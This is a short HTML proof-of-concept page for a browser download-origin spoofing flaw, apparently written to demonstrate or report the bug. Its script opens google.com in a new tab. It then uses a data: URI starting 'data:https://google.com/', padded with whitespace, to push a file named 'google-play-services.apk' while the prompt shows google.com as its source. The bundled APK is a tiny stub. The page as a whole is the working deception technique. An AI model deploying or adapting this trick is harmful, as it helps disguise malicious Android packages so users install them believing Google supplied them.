<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>POC - Download Origin Spoof</title>
  <style>
    body { font-family: Arial, sans-serif; background: #fff; padding: 40px 20px; text-align: center; }
    h3 { color: #333; }
    input {
      padding: 14px 20px; font-size: 16px; border: 2px solid #ea4335;
      border-radius: 24px; width: 260px; text-align: center; cursor: pointer; outline: none;
    }
    .note { color: #666; font-size: 12px; margin-top: 14px; }
    .info { color: #999; font-size: 11px; margin-top: 30px; line-height: 1.6; }
  </style>
</head>
<body>
  <h3>Download Origin Spoof POC</h3>
  <input type="text" id="btn" placeholder="Tap to trigger" readonly>
  <p class="note">Download prompt will show <b>google.com</b> as origin</p>
  <p class="info">
    Real page: <span id="real"></span><br>
    Download origin shown: <b style="color:#ea4335">data:https://google.com</b>
  </p>

  <script>
    document.getElementById('real').textContent = window.location.hostname;

    document.getElementById('btn').addEventListener('click', function() {
      // Open Google in new tab
      window.open('https://www.google.com', '_blank');

      // Trigger download on current page
      setTimeout(function() {
        var a = document.createElement('a');
        a.href = 'data:https://google.com/' + ' '.repeat(200) + 'application/vnd.android.package-archive;base64,UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
        a.download = 'google-play-services.apk';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      }, 500);
    });
  </script>
</body>
</html>
